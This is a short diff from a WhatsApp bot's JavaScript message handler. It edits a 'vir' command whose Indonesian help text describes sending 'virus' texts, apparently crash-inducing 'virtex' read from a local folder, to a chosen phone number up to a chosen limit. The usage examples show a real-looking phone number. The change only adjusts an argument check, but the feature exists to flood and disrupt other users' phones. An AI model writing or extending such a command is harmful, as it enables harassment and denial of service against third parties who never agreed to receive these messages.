@@ -148,7 +148,7 @@ module.exports = msgHandler = async (client, message) => {
             })
             break
         case 'vir':
-            if (args.length <= 2 || body.split(' ')[1]>5) return client.reply(from,'Halo kak fitur bisa digunakan jika si penerima/pengirim pesan sudah membuka chat (Sudah pernah chatingan sebelumnya), jika belom pernah maka fitur ini tidak akan work.\n\nvir [nomor] [virus 1-5] [limit]\n\nContoh:\nvir 6282237416678 3 10\nvir 6282237416678 5 10\nvir 6282237416678 rnd 10')
+            if (args.length <= 2 || body.split(' ')[3]>5) return client.reply(from,'Halo kak fitur bisa digunakan jika si penerima/pengirim pesan sudah membuka chat (Sudah pernah chatingan sebelumnya), jika belom pernah maka fitur ini tidak akan work.\n\nvir [nomor] [virus 1-5] [limit]\n\nContoh:\nvir 6282237416678 3 10\nvir 6282237416678 5 10\nvir 6282237416678 rnd 10')
             var inih = fs.readFileSync(`virteks/${mde}`,'utf-8')
             var nmrny = body.split(' ')[1]+`@c.us`
             if(body.split(' ')[2]==='rnd'){
